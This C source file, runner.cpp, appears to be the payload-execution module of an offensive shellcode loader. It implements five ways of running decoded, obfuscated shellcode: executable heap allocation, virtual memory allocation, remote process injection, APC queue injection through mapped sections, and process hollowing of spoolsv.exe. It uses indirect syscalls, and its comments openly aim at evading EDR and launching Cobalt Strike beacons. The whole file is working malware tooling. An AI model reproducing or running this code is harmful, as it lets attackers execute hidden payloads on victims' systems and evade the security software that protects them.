// runner.cpp - runner functions are loaded here.
// ___________
// \_   _____/ _____ ______   ___________  ___________ 
//  |    __)_ /     \\____ \_/ __ \_  __ \/  _ \_  __ \
//  |        \  Y Y  \  |_> >  ___/|  | \(  <_> )  | \/
// /_______  /__|_|  /   __/ \___  >__|   \____/|__|   
//         \/      \/|__|        \/                    
//

//                        ..::--:....                        
//                     .-#%%%%%%%%#*=:.......::-..           
//                  ..=#%%%%%@@@%%%%%%###***#***+=.          
//                 .-===##%%%%%%%#*+=--=+*--......           
//                .=+==+%%%%%%%%*-==*#%#:....                
//               .=-=+=#@@@@%%%%@@@%%%=.                     
//             .:==::==%%@%%%%%%%%%%%:.                      
//           .:+**=-::-=#%%%%%%%%%%*:.                       
//        ..-*****+=------=+##%%%#-...                       
//        .+****+++++==----===****=:..                       
//       .*#**+++++*+++++++++==-----=-..                     
//      .+#*+=+***####=-::--::::::::::..                     
//      :#*=+**####+:::::::::::::::::::..                    
//     .+*+***###+-:::::::::::::::...::..                    
//    .-*===*##*-:..::::::::::::....:::..                    
//    :#+=-=+#%*:...:::::::::..:::--:::..                    
//   .*+===++%*:::..::::::::...:::::::::..                   
//  .+*+++##*%-:::....::::::.......:::::..                   
//  :#+++*%#**:::.....:::::::::....::::-:.                   
// .+#*+*#%##-:::.....:::::::::::::::::-+.                   
// :*****#@#=:::.....::::::::::::::::::-#+                   
//.=*+***#%-:::.....:::::::::::::::::::-*%-                  
//.+*****#=-:::::...:::::::------:---:::-+%:                 

// include dependencies
// syscalls.h has indirect_randomized syswhispers3 implementation
#include "syscalls.h"
// includes our function prototypes
#include "runner.h"
// includes decoder function prototype
#include "decode.h"
// includes our global definitions
#include "defs.h"
#include <stdio.h>


// Self-loading -> uses heapalloc as an allocator
#ifdef RUN_HEAP
// takes in a pointer to our buffer, pBuf, a pointer to our decoding dictionary, pDict
// and the size of our buffer, buf_size. This function allocates memory on the process
// heap that's executable, writes our shellcode to it, and then executes it.
void run_nomigrate_heap(const char** pBuf, const char** pDict, size_t buf_size)
{
    // initializes some variables that we'll load values into later
    HANDLE hHeap = NULL;
    LPVOID pBaseAddr = NULL;
    BOOL bResult = 0;

    // gets the handle to our current process for later use
    HANDLE hProc = GetCurrentProcess();

    // attempts to create a heap with execution enabled for us to write to
    // the next parameters are dwInitialSize and dwHeapMaximumSize. When we pass in
    // 0 for the initial size, we allocate one page (4096 bytes) by default, this is fine.
    // when we set maximum size to 0, it allows the heap to grow in size, this is what we want.
    hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
#ifdef VERBOSE
    if (hHeap == NULL)
        printf("[!] Heap creation failed!\n");
#endif


    // allocates memory for our payload on the heap, this is a normal thing for applications to do
    // for example "malloc" command in c.
    // the "0" parameter is the flag to use with allocation, we don't want to overwrite anything, so it's 0
    pBaseAddr = HeapAlloc(hHeap, 0, buf_size);

#ifdef VERBOSE
    if (pBaseAddr == NULL)
        printf("[!] HeapAlloc failed to allocate memory!\n\n");
#endif
    
	// decode our payload
	unsigned char* buf = decode(pBuf, pDict, buf_size);
    
#ifdef VERBOSE
    printf("[+] Buffer Decoded first four bytes are %d %d %d %d.\n", buf[0], buf[1], buf[2], buf[3]);
#endif

    // this will store the number of bytes written with NtWriteVirtualMemory
    SIZE_T dwBytesWritten = 0;
    // writes our buffer starting at base address pBaseAddr, in process hProc, and writes "buf_size" number
    // of bytes. The number of bytes successfully written is returned in dwBytesWritten
    bResult = Sw3NtWriteVirtualMemory(hProc, pBaseAddr, buf, buf_size, &dwBytesWritten);
    
#ifdef VERBOSE
    if (bResult != 0)
        printf("[!] ");
    else
        printf("[+] ");
    printf("NtWriteVirtualMemory executed with code %d. This should be 0.\n", bResult);
    printf("%d bytes written to memory address %x.\n\n", dwBytesWritten, pBaseAddr);
#endif

    // creats an empty variable to hold the handle to the thread
    HANDLE hThread = NULL;
    // gets in a pointer to the thread handle object so they can fill it in. We give us all access control over this thread,
    // we start running the thread at base addr pBaseAddr since that's where our shellcode is
    bResult = Sw3NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProc, pBaseAddr, NULL, FALSE, 0, 0, 0, NULL);
#ifdef VERBOSE
    if (bResult != 0)
        printf("[!] ");
    else
        printf("[+] ");
    printf("NtCreateThreadEx executed with code %d. This should be 0.\n", bResult);
#endif


    // hangs for infinity while our shellcode runs. exiting the thread should kill the process (covering us from a sanitization
    // standpoint for the Cobalt Strike ExitProcess() and ExitThread() exit functions.
    WaitForSingleObject(hThread, INFINITE);


    // this will usually not run, but I have it here in case our beacon thread executes and we have the opportunity to garbage collect
    CloseHandle(hProc);
    CloseHandle(hThread);
    HeapDestroy(hHeap);
}
#endif

// Self-loading -> uses NtAllocateVirtualMemory as an allocator
#ifdef RUN_VIRTUAL
// takes in pBuf, a pointer to our buffer, pDict, a pointer to our dictionary for decoding,
// and buf_size, the size of our buffer
void run_nomigrate_virtual(const char** pBuf, const char** pDict, SIZE_T buf_size)
{
    // initialize a variable that will store our error as we progress through the function.
    // then during debugging we can check to see what the error is to retrieve the error code
    DWORD dwLastError = 0;

    // defines the pointer to where our beacon sits in memory. 
    LPVOID pBaseAddr = NULL;

    // Decodes our payload in memory. Uses the dictionary we provide by reference
    unsigned char* buf = decode(pBuf, pDict, buf_size);

#ifdef VERBOSE
    printf("[+] Buffer Decoded first four bytes are %d %d %d %d.\n\n", buf[0], buf[1], buf[2], buf[3]);
#endif

    // Gets a handle to the current process. We'll need this for our syscalls to self-load
    HANDLE hProc = GetCurrentProcess();
    
    // Frees and then allocates virtual memory. we do this so we can ensure we have enough space for larger beacons (CS)
    // Here we provide a handle to the process that we want to free memory in (our current process), the base address to start freeing at
    // here pBaseAddr is NULL so it'll start freeing at Virtual Address 0x00000000, and we want to fully release this memory (vs decommit it)
    dwLastError = Sw3NtFreeVirtualMemory(hProc, &pBaseAddr, &buf_size, MEM_RELEASE);

#ifdef VERBOSE
    if (dwLastError != 0)
        printf("[!] ");
    else
        printf("[+] ");
    printf("NtFreeVirtualMemory ran with code %x. This should be 0. But not a big deal if it fails, this just helps if we don't have memory already.\n", dwLastError);
#endif

    // this again requires the handle to the process we want to allocate memory in, and a pointer to what holds our base address,
    // so by the time this function ends, pBaseAddr will contain the base address our shellcode is at
    // we allocate a memory block with PAGE_READWRITE permissions of size buf_size. 
    dwLastError = Sw3NtAllocateVirtualMemory(hProc, &pBaseAddr, 0, &buf_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

#ifdef VERBOSE
    if (dwLastError != 0)
        printf("[!] ");
    else
        printf("[+] ");
    printf("AllocateVirtualMemory ran with code %x. This should be 0\n", dwLastError);
    if (dwLastError != 0)
        printf("[!] ");
    else
        printf("[+] ");
    printf("Base address used for allocating is at %x\n", pBaseAddr);
    if (dwLastError != 0)
        printf("[!] ");
    else
        printf("[+] ");
    printf("%d bytes alloczted.\n\n", buf_size);
#endif

    // Writes our decoded buffer to this memory segment. we have to give a variable to hold how many bytes were actually written
    SIZE_T bytes_written = 0;
    // takes our current process handle, the base address to start writing, the buffer to write, the size of the buffer to write
    // and stores how much was written in bytes
    dwLastError = Sw3NtWriteVirtualMemory(hProc, pBaseAddr, buf, buf_size, &bytes_written);

#ifdef VERBOSE
    if (dwLastError != 0)
        printf("[!] ");
    else
        printf("[+] ");
    
    printf("NtWriteVritualMemory executed with code %d. This should be 0.\n", dwLastError);
    if (dwLastError != 0)
        printf("[!] ");
    else
        printf("[+] ");
    printf("%d bytes written to address %x.\n\n", bytes_written, pBaseAddr);
#endif

    // this variable exits to store our old protections
    DWORD dwOldProtect = 0;
    // changes the protection on a give section of memory (at pBaseAddr) in process hProc, of size buf_size.
    // we change to execute read so we don't have RWX sections of beacon memory running
    dwLastError = Sw3NtProtectVirtualMemory(hProc, &pBaseAddr, &buf_size, PAGE_EXECUTE_READ, &dwOldProtect);
#ifdef VERBOSE
    if (dwLastError != 0)
        printf("[!] ");
    else
        printf("[+] ");
    printf("NtProtectVirtualMemory executed with code %d. This should be 0.\n", dwLastError);
#endif

    // creats an empty variable to hold the handle to the thread
    HANDLE hThread = NULL;
    // gets in a pointer to the thread handle object so they can fill it in. We give us all access control over this thread,
    // we start running the thread at base addr pBaseAddr since that's where our shellcode is
    dwLastError = Sw3NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProc, (LPTHREAD_START_ROUTINE)pBaseAddr, NULL, FALSE, 0, 0, 0, NULL);
#ifdef VERBOSE
    if (dwLastError != 0)
        printf("[!] ");
    else
        printf("[+] ");
    printf("NtCreateThreadEx executed with code %d. This should be 0.\n", dwLastError);
#endif

    // hangs for infinity while our shellcode runs. exiting the thread should kill the process (covering us from a sanitization
    // standpoint for the Cobalt Strike ExitProcess() and ExitThread() exit functions.
    WaitForSingleObject(hThread, INFINITE);


    // this will usually not run, but I have it here in case our beacon thread executes and we have the opportunity to garbage collect
    CloseHandle(hProc);
    CloseHandle(hThread);
    Sw3NtFreeVirtualMemory(hProc, &pBaseAddr, &buf_size, MEM_RELEASE);
}
#endif


#ifdef RUN_INJECT
// performs a basic process injection of a child process. does so using indirect randomized syscalls gathered from syswhispers3
// given that we're using syscalls for this, you will probably be as fine as you can be from an opsec perspective, however, 
// this is the defacto migration technique, so EDR has been better and better at detecting. definetely worth a try in your target
// environment. This also does not use RWX permissions so that is a plus.
void run_migrate_inject(const char** pBuf, const char** pDict, size_t buf_size, const char** pCmd_line, size_t cmd_line_size)
{
    // initializes and 0's out structures that are important for process creation
    STARTUPINFOA start_info;
    ZeroMemory(&start_info, sizeof(start_info));
    PROCESS_INFORMATION proc_info;
    ZeroMemory(&proc_info, sizeof(proc_info));

    // decodes our process command line
    char* cmd_line = (char*)decode(pCmd_line, pDict, cmd_line_size);

    // initializes variables that will be used later
    DWORD dwLastError = 0;
    LPVOID pBaseAddr = NULL;

    // creates a child process 
    dwLastError = CreateProcessA(NULL, cmd_line, NULL, NULL, PROCESS_ALL_ACCESS, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &start_info, &proc_info);
#ifdef VERBOSE
    if (dwLastError != 1)
        printf("[!] ");
    else
    {
        printf("[+] Process ID: %lu\n", proc_info.dwProcessId);
        printf("[+] ");
    }

    printf("CreateProcess executed with code %d. This should be 1.\n\n", dwLastError);

#endif

    // decodes our payload
    unsigned char* buf = decode(pBuf, pDict, buf_size);
#ifdef VERBOSE
    printf("[+] Buffer Decoded first four bytes are %d %d %d %d.\n\n", buf[0], buf[1], buf[2], buf[3]);
#endif

    // allocates memory in our child process starting at base address pBaseAddr
    dwLastError = Sw3NtAllocateVirtualMemory(proc_info.hProcess, &pBaseAddr, 0, (PSIZE_T)&buf_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    printf("AllocateVirtualMemory %d\n", dwLastError);
#ifdef VERBOSE
    if (dwLastError != 0)
        printf("[!] ");
    else
        printf("[+] ");
    printf("AllocateVirtualMemory ran with code %x. This should be 0\n", dwLastError);
    if (dwLastError != 0)
        printf("[!] ");
    else
        printf("[+] ");
    printf("Base address used for allocating is at %x\n", pBaseAddr);
    if (dwLastError != 0)
        printf("[!] ");
    else
        printf("[+] ");
    printf("%d bytes alloczted.\n\n", buf_size);
#endif
    
    // writes our buffer to our child process' memory and stores the number of bytes written to those memory
    // pages in bytesWritten
    SIZE_T bytes_written = 0;
    dwLastError = Sw3NtWriteVirtualMemory(proc_info.hProcess, pBaseAddr, buf, (SIZE_T)buf_size, &bytes_written);
    printf("WriteVirtualMemory %d\n", dwLastError);

#ifdef VERBOSE
    if (dwLastError != 0)
        printf("[!] ");
    else
        printf("[+] ");

    printf("NtWriteVritualMemory executed with code %d. This should be 0.\n", dwLastError);
    if (dwLastError != 0)
        printf("[!] ");
    else
        printf("[+] ");
    printf("%d bytes written to address %x.\n\n", bytes_written, pBaseAddr);
#endif

    // changes memory permissions for evasion purposes
    DWORD dwOldProtect = 0;
    dwLastError = Sw3NtProtectVirtualMemory(proc_info.hProcess, &pBaseAddr, (PSIZE_T)&buf_size, PAGE_EXECUTE_READ, &dwOldProtect);
#ifdef VERBOSE
    if (dwLastError != 0)
        printf("[!] ");
    else
        printf("[+] ");
    printf("NtProtectVirtualMemory executed with code %d. This should be 0.\n", dwLastError);
#endif

    // creates a thread that will start execution of our payload in the child process
    HANDLE hThread = NULL;
    dwLastError = Sw3NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, proc_info.hProcess, (LPTHREAD_START_ROUTINE)pBaseAddr, NULL, FALSE, 0, 0, 0, NULL);
#ifdef VERBOSE
    if (dwLastError != 0)
        printf("[!] ");
    else
        printf("[+] ");
    printf("NtCreateThreadEx executed with code %d. This should be 0.\n", dwLastError);
#endif

    CloseHandle(hThread);
    CloseHandle(proc_info.hProcess);

}
#endif



#ifdef RUN_APC
// for this we need our buffer and command line pointers and sizes, as well as the pointer to our dictionary for decoding.
// this creates a child process and injects into it via queuing a remote APC. using mapped memory. We map the memory into
// our own process and then copy that mapping into another process. I don't know how to make this work without using RWX,
// since the mapped memory permissions can't be changed with VirtualProtect (at least this implementation). But a good
// migration technique all the same. Probably the recommended over standard injection.
void run_migrate_apc(const char** pBuf, const char** pDict, size_t buf_size, const char** pCmd_line, size_t cmd_line_size)
{
    // Initializes some variables we'll need later
    DWORD dwLastError = 0;
    HANDLE hSectionHandle = NULL;
    LARGE_INTEGER liSectionSize;
    LPVOID lpMapViewOfShellcode = NULL;

    // sets the size of the section to allocate equal to the size of our buffer
    liSectionSize.HighPart = 0;
    liSectionSize.LowPart = buf_size;
    // gives us a section handle with all access permissions, the first null value is an object attributes value that
    // we don't need. the second null value is an optional file handle in case we wanted to create the section from a file
    dwLastError = Sw3NtCreateSection(&hSectionHandle, SECTION_ALL_ACCESS, NULL, &liSectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

#ifdef VERBOSE
    if (dwLastError != 0)
        printf("[!] ");
    else
        printf("[+] ");
    printf("NtCreateSection executed with code %d. This should be 0.\n\n", dwLastError);
#endif

    // This takes our section of memory and allocates memory for it
    LPVOID base_addr = NULL;
    SIZE_T viewSize = 0;
    // sets our mapped view to store the base address in lpMapViewOfShellcode, ignores additional
    // parameters, and sets any child process to inherit this view
    dwLastError = Sw3NtMapViewOfSection(hSectionHandle, GetCurrentProcess(), &lpMapViewOfShellcode, 0, 0, NULL, &viewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE);
    
#ifdef VERBOSE
    if (dwLastError != 0)
        printf("[!] ");
    else
        printf("[+] ");
    printf("NtMapViewOfSection executed with code %d. This should be 0.\n", dwLastError);
    printf("Base Address of the mapped view is %x.\n\n", lpMapViewOfShellcode);
#endif

    // decodes our buffer
    unsigned char *buf = (unsigned char*)decode(pBuf, pDict, buf_size);
#ifdef VERBOSE
    printf("[+] Buffer Decoded first four bytes are %d %d %d %d.\n\n", buf[0], buf[1], buf[2], buf[3]);
#endif

    // copies our buffer into memory 
    SIZE_T bytesWritten = 0;
    memcpy(lpMapViewOfShellcode, buf, buf_size);

    // initializes and zeros structures necessary for process creation
    STARTUPINFOA start_info;
    ZeroMemory(&start_info, sizeof(start_info));
    PROCESS_INFORMATION proc_info;
    ZeroMemory(&proc_info, sizeof(proc_info));

    // decodes our command line argument for the child process
    char* cmd_line = (char*)decode((const char**)pCmd_line, pDict, cmd_line_size);
#ifdef VERBOSE
    printf("[+] Buffer Decoded first four bytes are %c %c %c %c.\n\n", cmd_line[0], cmd_line[1], cmd_line[2], cmd_line[3]);
#endif

    // creates a child process and stores information about it in start_info and proc_info structs. suspends the process and makes
    // sure no windows ar visible. suspended processes are typically not hooked by security products yet giving us an edge if we
    // can get our beacon in and masked before EDR hooks
    dwLastError = CreateProcessA(NULL, cmd_line, NULL, NULL, PROCESS_ALL_ACCESS, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &start_info, &proc_info);

#ifdef VERBOSE
    if (dwLastError != 1)
        printf("[!] ");
    else
    {
        printf("[+] Process ID: %lu\n", proc_info.dwProcessId);
        printf("[+] ");
    }
        
    printf("CreateProcess executed with code %d. This should be 1.\n\n", dwLastError);
    
#endif

    // Maps a view of our section into the child process we just created
    dwLastError = Sw3NtMapViewOfSection(hSectionHandle, proc_info.hProcess, &base_addr, 0, 0, 0, &viewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE);

#ifdef VERBOSE
    if (dwLastError != 0)
        printf("[!] ");
    else
        printf("[+] ");
    printf("NtMapViewOfSection executed with code %d. This should be 0.\n", dwLastError);
    printf("Base Address of the mapped view is %x.\n\n", lpMapViewOfShellcode);
#endif
    
    dwLastError = Sw3NtUnmapViewOfSection(GetCurrentProcess(), lpMapViewOfShellcode);
#ifdef VERBOSE
    if (dwLastError != 0)
        printf("[!] ");
    else
        printf("[+] ");
    printf("NtUnMapViewOfSection executed with code %d. This should be 0.\n", dwLastError);
    printf("Base Address of the unmapped view is %x.\n\n", lpMapViewOfShellcode);
#endif

    // closes the handle to ur section for garbage collection
    Sw3NtClose(hSectionHandle);

    // suspends the current thread to the process
    DWORD dwSuspendCount = 0;
    dwLastError = Sw3NtSuspendThread(proc_info.hThread, &dwSuspendCount);

    // queue's an asyncronous procedure call (apc) to call the shellcode as the primary thread
    dwLastError = Sw3NtQueueApcThread(proc_info.hThread, (PKNORMAL_ROUTINE)base_addr, 0, NULL, NULL);

    // resumes the thread and process so execution kicks off
    Sw3NtResumeThread(proc_info.hThread, &dwSuspendCount);
    Sw3NtResumeProcess(proc_info.hProcess);

    // Garbage cloolection
    CloseHandle(proc_info.hThread);
    CloseHandle(proc_info.hProcess);
}
#endif


#ifdef RUN_HOLLOW
// performs shellcode execution via process hollowing. This is the stealthiest method to pivot here, however, there's a catch...
// you can only hollow into processes where there is space for you, the entry point to the end of the allocated memory for that
// process... with something like Cobalt Strike, which is pretty big, this isn't sustainable long term, it can already barely
// fit in anything. You could modify this by allocating more memory, but I feel like that kind of defeats the purpose. Your
// best bet is probably using this with smaller post ex shellcode or a stager.

// defines a structure for processes that we'll need later
struct PROCESS_BASIC_INFORMATION
{
    NTSTATUS ExitStatus;
    intptr_t PebBaseAddress;
    uintptr_t AffinityMask;
    int BasePriority;
    uintptr_t UniqueProcessId;
    uintptr_t InheritedFromUniqueProcessId;
};

void run_migrate_hollow(const char** pBuf, const char** pDict, size_t buf_len, const char** pCmd_line, size_t cmd_line_size)
{

    // Defines structures and initializes them
    // startup info is used to specify standard handles for process we create
    // if we are parent process spoofing, we need to have an extended process information structure defined
    STARTUPINFOA start_info;
    ZeroMemory(&start_info, sizeof(start_info));
    // process information is used to store information about a process and its primary thread
    PROCESS_BASIC_INFORMATION proc_basic_info;
    ZeroMemory(&proc_basic_info, sizeof(proc_basic_info));
    PROCESS_INFORMATION proc_info;
    ZeroMemory(&proc_basic_info, sizeof(proc_info));

    // initializes an error storage variable
    DWORD dwLastError = 0;

    char cmd_line[] = "C:\\Windows\\System32\\spoolsv.exe";
    // Attempts to create a process with the specified command line
    dwLastError = CreateProcessA(NULL,   // No module name (use command line)
        cmd_line,          // Command line
        NULL,                   // Process handle not inheritable
        NULL,                   // Thread handle not inheritable
        PROCESS_ALL_ACCESS,     // Set handle inheritance to FALSE
        CREATE_SUSPENDED,       // Create the process in the suspended state
        NULL,                   // Use parent's environment block
        NULL,                   // Use parent's starting directory 
        &start_info,            // Pointer to STARTUPINFO structure
        &proc_info);            // Pointer to PROCESS_INFORMATION structure
        
#ifdef VERBOSE
        if (dwLastError != 1)
            printf("[!] ");
        else
        {
            printf("[+] Process ID: %lu\n", proc_info.dwProcessId);
            printf("[+] ");
        }

    printf("CreateProcess executed with code %d. This should be 1.\n\n", dwLastError);

#endif



    // Now that we have created a remote process, we need to query information on that process to interact with it later
    // IN HANDLE ProcessHandle                      - the handle to the process we want to query information on
    // IN PROCESSINFOCLASS ProcessInformationClass  - the type of information we want to receive, we will ask for a pointer to the PEB
    // OUT PVOID ProcessInformation                 - which variable stores the information on our process
    // IN ULONG ProcessInformationLength            - how much data in bytes we want from the process
    // OUT PULONG ReturnLength OPTIONAL             - a pointer to the variable where the size of the PEB is returned
    dwLastError = Sw3NtQueryInformationProcess(proc_info.hProcess, (PROCESSINFOCLASS)0, &proc_basic_info, sizeof(proc_basic_info), NULL);

#ifdef VERBOSE
    if (dwLastError != 0)
        printf("[!] ");
    else
        printf("[+] ");
    printf("NtQueryInformationProcess executed with code: %d\n", dwLastError);
    if (dwLastError != 0)
        printf("[!] ");
    else
        printf("[+] ");
    printf("The PEB's address is %X\n\n", proc_basic_info.PebBaseAddress);
#endif



    // initializes some variables based on 64 bit architecture on where to read and write memory to
    // this will store the 
    uintptr_t base_addr = (uintptr_t)proc_basic_info.PebBaseAddress + 0x10;
    BYTE proc_addr[64];
    BYTE data_buf[0x200];
    SIZE_T bytes_readorwritten = 0;

    // reads the memory of our process that we've spawned
    // IN HANDLE ProcessHandle                  - requires a handle to the process to read the memory of
    // IN PVOID BaseAddress OPTIONAL            - the base address of the PEB based on 64 bit architecture
    // OUT PVOID Buffer                         - outputs the buffer of the process to proc_addr
    // IN SIZE_T BufferSize                     - takes in the size of the buffer to write to
    // OUT PSIZE_T NumberOfBytesRead OPTIONAL   - prints how much was read or written by the process
    dwLastError = Sw3NtReadVirtualMemory(proc_info.hProcess, (LPVOID)base_addr, proc_addr, 64, &bytes_readorwritten);


  
#ifdef VERBOSE  
    if (dwLastError != 0)
        printf("[!] ");
    else
    {
        printf("We have read the memory of the process we spawned as a child.\n");
        printf("[+] ");
    }
    printf("NtReadVirtualMemory executed with code %d. This should be 0.\n", dwLastError);
    if (dwLastError != 0)
        printf("[!] ");
    else
        printf("[+] ");
    printf("The address of our process is %X\n", proc_addr);
    if (dwLastError != 0)
        printf("[!] ");
    else
        printf("[+] ");
    printf("The number of bytes read is %d\n\n", bytes_readorwritten);
#endif

    // sets our shellcode's address equal to the processes address that we just read out
    uintptr_t shell_addr = *((uintptr_t*)proc_addr);
    dwLastError = Sw3NtReadVirtualMemory(proc_info.hProcess, (LPVOID)shell_addr, data_buf, sizeof(data_buf), &bytes_readorwritten);


     // gets the symbol we want to place in front of our debug stuff depending on if we failed or not
#ifdef VERBOSE
    if (dwLastError != 0)
        printf("[!] ");
    else
    {
        printf("We have read the memory of the shellcode we want to put in the hollowed process.\n");
        printf("[+] ");
    }
    printf("NtReadVirtualMemory executed with code %d. This should be 0.\n", dwLastError);
    if (dwLastError != 0)
        printf("[!] ");
    else
        printf("[+] ");
    printf("The address of our shellcode is %X\n", shell_addr);
    if (dwLastError != 0)
        printf("[!] ");
    else
        printf("[+] ");
    printf("The number of bytes read is %d\n\n", bytes_readorwritten);

#endif

    // performs some math based on a 64 bit architecture to find what offsets we need to point execution and writing to
    unsigned int e_lfanew = *((unsigned int*)(data_buf + 0x3c));
    unsigned int rvaOffset = e_lfanew + 0x28;
    unsigned int rva = *((unsigned int*)(data_buf + rvaOffset));

    // applies those offsets, this is used so we can figure out where our entry point of the shellcode is and change it
    // we need the entrypoint to be given as a PVOID and a pointer for different functions
    uintptr_t entry_addr_ptr = shell_addr + rva;
    PVOID entry_addr_void = (PVOID)entry_addr_ptr;
    // the size of what we'll want to write or change memory permissions on
    SIZE_T sizer = buf_len;

    // initializes a variable that stores what memory permissions should be
    DWORD old_perms = 0;

    // changes the memory permissions on our selected process to hollow to RW
    // IN HANDLE ProcessHandle    - the handle to the process who's memory region we are in
    // IN OUT PVOID * BaseAddress - the base address of the memory we want to change the permissions on
    // IN OUT PSIZE_T RegionSize  - the size of the memory region we want to change the permissions of
    // IN ULONG NewProtect        - what permissions we want the memory region to have
    // OUT PULONG OldProtect      - stores what the old permissions were
    dwLastError = Sw3NtProtectVirtualMemory(proc_info.hProcess, &entry_addr_void, &sizer, PAGE_READWRITE, &old_perms);

#ifdef VERBOSE
    if (dwLastError != 0)
        printf("[!] ");
    else
        printf("[+] ");
    printf("NtProtectVirtualMemory executed with code %d. This should be 0.\n", dwLastError);
    if (dwLastError != 0)
        printf("[!] ");
    else
        printf("[+] ");
    printf("The shellcode address is: 0x%lp\n", shell_addr);
    if (dwLastError != 0)
        printf("[!] ");
    else
        printf("[+] ");
    printf("The shellcode entry point is: 0x%lp\n", entry_addr_ptr);
    if (dwLastError != 0)
        printf("[!] ");
    else
        printf("[+] ");
    printf("The number of bytes with their permissions changed is %d\n", sizer);
    if (dwLastError != 0)
        printf("[!] ");
    else
        printf("[+] ");
    printf("The old permissions on that memory region was %x\n", old_perms);
#endif

    // decoes our payload
    unsigned char* buf = decode(pBuf, pDict, buf_len);
#ifdef VERBOSE
    printf("[+] Buffer Decoded first four bytes are %d %d %d %d.\n\n", buf[0], buf[1], buf[2], buf[3]);
#endif

    // Next we write our shellocde to the memory of our process
    // IN HANDLE ProcessHandle                   - takes in a process handle so we know what process we are allocating memory in
    // IN PVOID BaseAddress                      - takes in the base address of a specified process to which data will start being written
    // IN PVOID Buffer                           - the shellocde we want to write to that memory section
    // IN SIZE_T NumberOfBytesToWrite            - the number of bytes to write to the specified process
    // OUT PSIZE_T NumberOfBytesWritten OPTIONAL - the number of bytes that were written to that memory region
    dwLastError = Sw3NtWriteVirtualMemory(proc_info.hProcess, (LPVOID)entry_addr_ptr, buf, buf_len, &bytes_readorwritten);

#ifdef VERBOSE
    if (dwLastError != 0)
        printf("[!] ");
    else
        printf("[+] ");
    printf("NtWriteVritualMemory executed with code %d. This should be 0.\n", dwLastError);
    if (dwLastError != 0)
        printf("[!] ");
    else
        printf("[+] ");
    printf("Number of bytes written is %d\n\n", bytes_readorwritten);
#endif

    // changes from RW to RX for OPSEC reasons and so we can execute the final shellcode
    dwLastError = Sw3NtProtectVirtualMemory(proc_info.hProcess, &entry_addr_void, &sizer, PAGE_EXECUTE_READ, &old_perms);

#ifdef VERBOSE
    if (dwLastError != 0)
        printf("[!] ");
    else
        printf("[+] ");
    printf("NtProtectVirtualMemory executed with code %d. This should be 0.\n", dwLastError);
    if (dwLastError != 0)
        printf("[!] ");
    else
        printf("[+] ");
    printf("The number of bytes with their permissions changed is %d\n", buf_len);
    if (dwLastError != 0)
        printf("[!] ");
    else
        printf("[+] ");
    printf("The old permissions on that memory region was %x\n", old_perms);
#endif


    // resumes the process whose handle we pass to it
    dwLastError = Sw3NtResumeProcess(proc_info.hProcess);

#ifdef VERBOSE
    if (dwLastError != 0)
        printf("[!] ");
    else
        printf("[+] ");
    printf("NtResumeProcess executed with code %d. This should be 0.\n", dwLastError);
#endif


}
#endif